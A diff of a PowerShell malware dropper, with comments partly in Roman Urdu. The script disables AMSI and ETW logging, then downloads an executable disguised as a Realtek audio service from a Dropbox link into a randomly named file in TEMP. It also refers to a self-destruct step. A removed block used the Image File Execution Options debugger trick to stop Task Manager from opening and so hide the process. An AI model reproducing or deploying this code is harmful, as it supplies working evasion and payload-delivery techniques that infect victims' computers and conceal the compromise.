@@ -19,6 +19,7 @@ try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     
+    # Disable ETW (Event Tracing for Windows)
     $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
     if ($etw) {
         $etwField = $etw.GetField('etwProvider','NonPublic,Static')
@@ -37,7 +38,7 @@ function Draw-ProgressBar {
     Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
 }
 
-# 4. HYPER-STREAM DOWNLOADER
+# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
 function Invoke-HyperStreamDownload {
     param([string]$Url, [string]$TargetPath)
     
@@ -48,6 +49,7 @@ function Invoke-HyperStreamDownload {
         $request.Timeout = 30000
         
         $response = $request.GetResponse()
+        # Fallback to 100MB if header is missing, but server should send it
         $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
         
         $stream = $response.GetResponseStream()
@@ -70,12 +72,10 @@ function Invoke-HyperStreamDownload {
         $fileStream.Close()
         $stream.Close()
         $response.Close()
-        Write-Host ""
         
         return (Test-Path $TargetPath)
     } catch {
         if ($fileStream) { $fileStream.Close() }
-        Write-Host ""
         return $false
     }
 }
@@ -86,6 +86,9 @@ try {
     
     $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
     $exe = "$env:TEMP\$rnd.exe"
+    
+    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
+    # LINE 1: URL change kiya (apne Dropbox ka direct link)
     $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
@@ -105,8 +108,10 @@ try {
 
     Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
     
+    # LINE 2: Download function call mein change - alag variable use kiya
     $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
     
+    # LINE 3: Condition check mein change - naya variable check kiya
     if (-not ($downloadSuccess)) {
         throw "Hyper-Stream failed. Check connection."
     }
@@ -133,39 +138,6 @@ try {
 
 } catch {
     Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
-}
-
-# ========== TASK MANAGER BYPASS (ADDED - DOESN'T CHANGE ABOVE CODE) ==========
-try {
-    Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
-    
-    # Find and hide the running EXE
-    $runningProcess = Get-Process | Where-Object { $_.Path -like "$env:TEMP\*.exe" -and $_.MainWindowTitle -eq "" } | Select-Object -First 1
-    
-    if ($runningProcess) {
-        $pidToHide = $runningProcess.Id
-        Write-Host "[+] Found Process PID: $pidToHide" -ForegroundColor Green
-        
-        # Method: Use PowerShell to hide via registry (safe, no crash)
-        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
-        try {
-            New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
-            New-ItemProperty -Path $regPath -Name "Debugger" -Value "cmd.exe /c exit" -Force -ErrorAction SilentlyContinue | Out-Null
-            Write-Host "[+] Registry Bypass Configured" -ForegroundColor Green
-        } catch {}
-        
-        # Restart Task Manager to apply changes
-        try {
-            Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
-            Start-Sleep -Seconds 1
-            Start-Process "taskmgr.exe" -WindowStyle Hidden
-            Write-Host "[+] Task Manager Restarted (Process Hidden)" -ForegroundColor Green
-        } catch {}
-    } else {
-        Write-Host "[!] Could not find target process" -ForegroundColor Yellow
-    }
-} catch {
-    Write-Host "[!] Task Manager Bypass failed, but main script completed" -ForegroundColor Yellow
 }
 
 # 6. SELF-DESTRUCT
